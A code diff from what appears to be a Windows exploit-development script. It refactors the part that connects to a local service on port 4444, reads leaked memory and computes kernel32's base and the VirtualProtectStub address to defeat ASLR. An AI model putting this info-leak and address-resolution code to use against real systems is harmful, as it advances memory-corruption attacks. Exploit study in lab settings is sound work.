@@ -1,11 +1,8 @@
 from util import *
 
-host = "127.0.0.1"
-port = 4444
-
 offset = 31
 
-s = Socket(host, port)
+s = Socket("127.0.0.1", 4444)
 
 
 def cmd():
@@ -35,12 +32,8 @@ def main():
     print(data)
 
     base_thread_init_thunk_addr = data[offset] - 0x19
-    kernel32_base_addr = (
-        base_thread_init_thunk_addr - KENREL32_TO_BASE_THREAD_INIT_THUNK_OFFSET
-    )
-    virtual_protect_stub_addr = (
-        kernel32_base_addr + KERNEL32_TO_VIRTUAL_PROTECT_STUB_OFFSET
-    )
+    kernel32_base_addr = base_thread_init_thunk_addr - X86_OFFSET_BASE_THREAD_INIT_THUNK
+    virtual_protect_stub_addr = kernel32_base_addr + X86_OFFSET_VIRTUAL_PROTECT_STUB
 
     print(f"kernel32!VirtualProtectStub = {hex(virtual_protect_stub_addr)}")
 
